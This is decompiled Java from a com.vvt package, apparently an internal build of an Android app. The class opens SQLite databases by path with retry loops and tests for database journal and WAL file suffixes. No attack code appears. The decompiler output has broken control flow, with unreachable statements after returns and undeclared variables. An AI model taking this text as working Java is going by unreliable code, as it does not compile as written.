package com.vvt.p;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;

public class c
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static String c = null;
  private static String d = null;
  
  private static SQLiteDatabase a(int paramInt)
  {
    boolean bool1 = false;
    SQLiteDatabase localSQLiteDatabase = null;
    String str1;
    int j;
    boolean bool2;
    if (0 == 0)
    {
      str1 = com.vvt.n.a.a(c);
      if (str1 != null)
      {
        str2 = "%s/%s";
        int i = 2;
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = str1;
        j = 1;
        String str3 = d;
        arrayOfObject[j] = str3;
        str1 = String.format(str2, arrayOfObject);
        bool2 = a;
        if (!bool2) {}
      }
    }
    for (String str2 = str1;; str2 = null)
    {
      if (str2 != null)
      {
        localSQLiteDatabase = a(str2, paramInt);
        j = 5;
        while ((localSQLiteDatabase == null) && (j > 0))
        {
          bool1 = a;
          if (bool1) {}
          long l = 1000L;
          SystemClock.sleep(l);
          localSQLiteDatabase = a(str2, paramInt);
          j += -1;
        }
      }
      return localSQLiteDatabase;
      j = 0;
      str1 = null;
      break;
      bool2 = false;
    }
  }
  
  public static SQLiteDatabase a(int paramInt, String paramString)
  {
    Object localObject;
    int i;
    if (paramString != null)
    {
      localObject = paramString.trim();
      i = ((String)localObject).length();
      if (i != 0) {}
    }
    else
    {
      i = 0;
      localObject = null;
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject;
      boolean bool1 = a;
      if (bool1) {}
      SQLiteDatabase localSQLiteDatabase1 = b(paramInt, paramString);
      int j = 5;
      localObject = localSQLiteDatabase1;
      int m = j;
      while ((localObject == null) && (m > 0))
      {
        boolean bool2 = a;
        if (bool2) {}
        long l = 1000L;
        SystemClock.sleep(l);
        SQLiteDatabase localSQLiteDatabase2 = b(paramInt, paramString);
        int k = m + -1;
        m = k;
        localObject = localSQLiteDatabase2;
      }
    }
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    bool = false;
    try
    {
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  public static SQLiteDatabase a(String paramString1, String paramString2)
  {
    c = paramString1;
    d = paramString2;
    Object localObject = c;
    if (localObject != null)
    {
      localObject = d;
      if (localObject != null) {}
    }
    else
    {
      boolean bool = a;
      if (bool) {}
      bool = false;
    }
    int i;
    for (localObject = null;; localObject = a(i))
    {
      return (SQLiteDatabase)localObject;
      i = 17;
    }
  }
  
  public static boolean a(String paramString)
  {
    boolean bool1 = true;
    String str1;
    boolean bool3;
    if (paramString != null)
    {
      str1 = paramString.trim();
      String str2 = ".db-shm";
      boolean bool2 = str1.endsWith(str2);
      if (!bool2)
      {
        str2 = ".db-wal";
        bool2 = str1.endsWith(str2);
        if (!bool2)
        {
          str2 = ".db-journal";
          bool3 = str1.endsWith(str2);
          if (!bool3) {
            break label76;
          }
        }
      }
      bool3 = bool1;
      label59:
      if (bool3) {
        break label84;
      }
      bool3 = bool1;
    }
    for (;;)
    {
      return bool3;
      str1 = "";
      break;
      label76:
      bool3 = false;
      str1 = null;
      break label59;
      label84:
      bool3 = false;
      str1 = null;
    }
  }
  
  private static SQLiteDatabase b(int paramInt, String paramString)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    bool = a;
    if (bool) {}
    bool = false;
    try
    {
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  public static SQLiteDatabase b(String paramString1, String paramString2)
  {
    c = paramString1;
    d = paramString2;
    Object localObject = c;
    if (localObject != null)
    {
      localObject = d;
      if (localObject != null) {}
    }
    else
    {
      boolean bool = a;
      if (bool) {}
      bool = false;
    }
    int i;
    for (localObject = null;; localObject = a(i))
    {
      return (SQLiteDatabase)localObject;
      i = 16;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/p/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */